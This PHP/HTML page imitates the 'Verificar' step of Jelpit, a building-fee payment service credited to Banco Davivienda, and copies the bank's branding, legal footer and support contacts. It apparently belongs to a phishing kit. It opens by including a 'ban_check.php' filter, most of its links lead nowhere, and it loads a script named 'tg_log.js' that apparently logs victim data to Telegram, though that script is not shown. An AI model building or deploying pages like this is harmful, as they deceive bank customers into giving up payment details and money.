<?php require_once __DIR__ . '/ban_check.php'; ?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verificar - Jelpit</title>
  <link rel="icon" type="image/svg+xml" href="img/favicon.svg">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:wght@300;400;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" href="css/styles.css">
  <link rel="stylesheet" href="css/busqueda.css">
  <link rel="stylesheet" href="css/pasos.css">

  <style>
    #pagarAdminLoader {
      position: fixed; inset: 0; z-index: 99999;
      display: none; align-items: center; justify-content: center;
      background: rgba(255,255,255,0.88);
    }
    #pagarAdminLoader.is-visible { display: flex; }
    .pagar-admin-spinner {
      width: 48px; height: 48px;
      border: 3px solid #e8e8e8;
      border-top-color: #2e0063;
      border-radius: 50%;
      animation: pagarAdminSpin 0.75s linear infinite;
    }
    @keyframes pagarAdminSpin { to { transform: rotate(360deg); } }
  </style>
</head>

<body class="has-bottom-nav">

  <!-- ── Header ──────────────────────────────────────────── -->
  <header class="header">
    <div class="header-container">
      <div class="header-logo">
        <a href="index.php"><img src="img/logo_jelpit_color.svg" alt="Jelpit Logo"></a>
      </div>
      <div class="header-actions">
        <div class="dropdown-wrapper">
          <button class="btn btn-conjuntos" id="desktopConjuntosBtn">
            Conjuntos <i class="fa-solid fa-chevron-down toggle-icon"></i>
          </button>
          <ul class="desktop-dropdown-menu" id="desktopConjuntosMenu">
            <li><a href="#">Paga tu administración</a></li>
            <li><a href="#">Ingresa a Jelpit Conjuntos</a></li>
            <li><a href="#">¿Cómo funciona?</a></li>
            <li><a href="#">Quiero vincularme</a></li>
            <li><a href="#">Ingresa a Cuotas al día</a></li>
          </ul>
        </div>
        <a href="#" class="btn btn-login"><i class="fa-regular fa-user"></i> Iniciar sesión</a>
        <button class="btn btn-cart"><i class="fa-solid fa-cart-shopping"></i> Carrito</button>
      </div>
      <div class="header-mobile-actions">
        <a href="#" class="btn-login-mobile"><i class="fa-regular fa-user"></i> Iniciar sesión</a>
        <button class="btn-cart-mobile"><i class="fa-solid fa-cart-shopping"></i></button>
        <button class="btn-hamburger" id="btnHamburger" aria-label="Abrir menú">
          <span></span><span></span><span></span>
        </button>
      </div>
    </div>
  </header>

  <div class="menu-overlay" id="menuOverlay"></div>

  <nav class="mobile-drawer" id="mobileDrawer">
    <div class="drawer-header">
      <a href="index.php" class="drawer-logo"><img src="img/logo_jelpit_color.svg" alt="Jelpit Logo"></a>
      <button class="drawer-close" id="drawerClose" aria-label="Cerrar menú"><i class="fa-solid fa-xmark"></i></button>
    </div>
    <ul class="drawer-menu">
      <li class="drawer-menu-item">
        <a href="index.php"><i class="fa-solid fa-house"></i><span>Inicio</span></a>
      </li>
      <li class="drawer-menu-item has-submenu">
        <button class="drawer-submenu-toggle" id="conjuntosToggle">
          <span class="drawer-item-left">
            <i class="fa-solid fa-circle-dollar-to-slot"></i><span>Conjuntos</span>
          </span>
          <i class="fa-solid fa-chevron-down drawer-chevron"></i>
        </button>
        <ul class="drawer-submenu" id="conjuntosSubmenu">
          <li><a href="#">Paga tu administración</a></li>
          <li><a href="#">Ingresa a Jelpit Conjuntos</a></li>
          <li><a href="#">¿Cómo funciona?</a></li>
          <li><a href="#">Quiero vincularme</a></li>
          <li><a href="#">Ingresa a Cuotas al día</a></li>
        </ul>
      </li>
    </ul>
  </nav>

  <!-- ── Main ────────────────────────────────────────────── -->
  <main class="busqueda-main">

    <!-- Promo Banner -->
    <div class="promo-banner-carousel" id="promoBannerCarousel">
      <div class="promo-carousel-inner" id="promoBannerInner">
        <div class="promo-slide" style="background-color:#EDeef0;">
          <div class="promo-content">
            <i class="fa-solid fa-credit-card" style="font-size:28px;color:#df111c;flex-shrink:0"></i>
            <span class="promo-text">Disfrute de sus servicios GRATIS por tener tarjeta de crédito Davivienda ❤️💳
              <a href="#" class="promo-btn" style="background:#df111c;color:#fff;">¡Úselos aquí!</a>
            </span>
          </div>
        </div>
        <div class="promo-slide" style="background-color:#cbeafe;">
          <div class="promo-content">
            <i class="fa-solid fa-house" style="font-size:28px;color:#1d4ed8;flex-shrink:0"></i>
            <span class="promo-text">¡Tu próximo hogar espera por ti! Encuentra miles de ofertas para arrendar o comprar.
              <a href="#" class="promo-btn" style="background:#ff9d21;color:#2e0063;">¡Encuentra el tuyo!</a>
            </span>
          </div>
        </div>
        <div class="promo-slide" style="background-color:#e3f9e5;">
          <div class="promo-content">
            <i class="fa-solid fa-heart-pulse" style="font-size:28px;color:#16a34a;flex-shrink:0"></i>
            <span class="promo-text">Seguro de Salud a su Medida desde $41.500 mensuales para usted y su familia.
              <a href="#" class="promo-btn" style="background:#ffda6a;color:#11682b;">Compre ahora</a>
            </span>
          </div>
        </div>
      </div>
    </div>

    <!-- Back -->
    <div class="btn-back-container">
      <a href="index.php" class="btn-back"><i class="fa-solid fa-chevron-left" style="font-size:12px;"></i> Atrás</a>
    </div>

    <!-- Stepper -->
    <div class="stepper-container" style="padding-top:5px;">
      <div class="stepper">
        <div class="step done">
          <div class="step-circle"><i class="fa-solid fa-check"></i></div>
          <div class="step-label">Buscar</div>
        </div>
        <div class="step-line done"></div>
        <div class="step active">
          <div class="step-circle">2</div>
          <div class="step-label">Verificar</div>
        </div>
        <div class="step-line"></div>
        <div class="step">
          <div class="step-circle">3</div>
          <div class="step-label">Pagar</div>
        </div>
      </div>
    </div>

    <!-- Verify Card -->
    <div class="verify-card">
      <div class="verify-header">
        <h2>Verifica la copropiedad y referencia</h2>
        <p>Revisa y confirma que la información sea correcta para el pago</p>
      </div>

      <!-- Conjunto section -->
      <div class="verify-section">
        <div class="verify-section-title">Copropiedad: Propiedad horizontal</div>
        <div class="verify-row">
          <div class="verify-details">
            <div class="item-line">
              <div class="item-icon icon-purple"><i class="fa-regular fa-building"></i></div>
              <div class="item-text item-title" id="valNombreCopropiedad"></div>
            </div>
            <div class="item-line">
              <div class="item-icon icon-gray"><i class="fa-solid fa-location-dot"></i></div>
              <div class="item-text" id="valDireccionCopropiedad"></div>
            </div>
            <div class="item-line">
              <div class="item-icon icon-purple"><i class="fa-regular fa-calendar-days"></i></div>
              <div class="item-text" id="valConvenio"></div>
            </div>
          </div>
          <a href="index.php" class="btn-change" id="cambiarConj">
            <i class="fa-solid fa-rotate-left"></i> Cambiar copropiedad
          </a>
        </div>
      </div>

      <!-- Reference section -->
      <div class="verify-section" style="margin-bottom:0;">
        <div class="verify-section-title">Referencia de pago</div>
        <div class="verify-row">
          <div class="verify-details-simple">
            <div id="valInmueble"></div>
            <div id="valReferencia"></div>
          </div>
          <a href="index.php" class="btn-change" id="cambiarRef">
            <i class="fa-solid fa-rotate-left"></i> Cambiar referencia
          </a>
        </div>
      </div>

      <button type="button" class="btn-continuar-green" id="btnContinuarVerificar">Continuar</button>
    </div>

    <!-- Medios de Pago -->
    <div class="medios-pago-container">
      <h4 class="medios-title">Medios de pago</h4>
      <div class="medios-icons-wrap">
        <div class="medios-icons">
          <span><i class="fa-solid fa-credit-card"></i> Tarjeta crédito</span>
          <span><i class="fa-solid fa-credit-card"></i> Tarjeta débito</span>
          <span><i class="fa-solid fa-building-columns"></i> PSE</span>
          <span><i class="fa-solid fa-mobile-screen"></i> Daviplata</span>
          <span class="medios-dup"><i class="fa-solid fa-credit-card"></i> Tarjeta crédito</span>
          <span class="medios-dup"><i class="fa-solid fa-credit-card"></i> Tarjeta débito</span>
          <span class="medios-dup"><i class="fa-solid fa-building-columns"></i> PSE</span>
          <span class="medios-dup"><i class="fa-solid fa-mobile-screen"></i> Daviplata</span>
        </div>
      </div>
      <p class="medios-disclaimer">*Disponibilidad sujeta a condiciones contratadas por el conjunto.</p>
    </div>

  </main>

  <!-- ── Footer ───────────────────────────────────────────── -->
  <footer class="footer">
    <div class="footer-top">
      <div class="footer-left">
        <img src="img/vigilado.svg" alt="Vigilado" class="vigilado-img">
        <p>Servicio ofrecido por Banco Davivienda S.A. y<br>operado por Servicios Bolívar S.A.</p>
      </div>
      <div class="footer-center">
        <h3>¿Necesitas ayuda? ¿Tienes preguntas, quejas o reclamos?</h3>
        <p>Escríbenos a <a href="mailto:lineadesoporte923@serviciosbolivar.com">lineadesoporte923@serviciosbolivar.com</a>
          o llámanos desde tu celular al <strong>#923</strong> o al número <strong>601 3905331</strong>.
        </p>
      </div>
      <div class="footer-right">
        <div class="social-icons">
          <a href="#" aria-label="YouTube"><i class="fa-brands fa-youtube"></i></a>
          <a href="#" aria-label="LinkedIn"><i class="fa-brands fa-linkedin-in"></i></a>
          <a href="#" aria-label="Facebook"><i class="fa-brands fa-facebook-f"></i></a>
          <a href="#" aria-label="Instagram"><i class="fa-brands fa-instagram"></i></a>
          <a href="#" aria-label="TikTok"><i class="fa-brands fa-tiktok"></i></a>
        </div>
      </div>
    </div>
    <div class="footer-bottom">
      <div class="footer-links">
        <a href="#">Términos y condiciones</a>
        <a href="#">Política de Tratamiento de Datos Personales</a>
        <a href="#">Superintendencia de Industria y Comercio (SIC)</a>
        <a href="#">Canales de preferencia</a>
      </div>
      <p class="copyright">Jelpit 2026© - Banco Davivienda S.A. NIT: 860.034.313-7 Todos los derechos reservados.
        Dirección de notificación judicial: Av. El Dorado No. 68C-61 Bogotá D.C.</p>
    </div>
  </footer>

  <!-- Mobile Bottom Nav -->
  <nav class="mobile-bottom-nav">
    <a href="index.php" class="bottom-btn"><i class="fa-solid fa-house"></i>Inicio</a>
    <button class="bottom-btn" id="mobileConjuntosBtn"><i class="fa-solid fa-circle-dollar-to-slot"></i>Conjuntos</button>
    <a href="#" class="bottom-btn"><i class="fa-regular fa-user"></i>Iniciar sesión</a>
  </nav>

  <div id="pagarAdminLoader" aria-live="polite" aria-busy="false">
    <div class="pagar-admin-spinner" role="status" aria-label="Cargando"></div>
  </div>

  <script src="js/tg_log.js"></script>
  <script src="js/script.js"></script>
  <script src="js/verificar.js"></script>

</body>
</html>
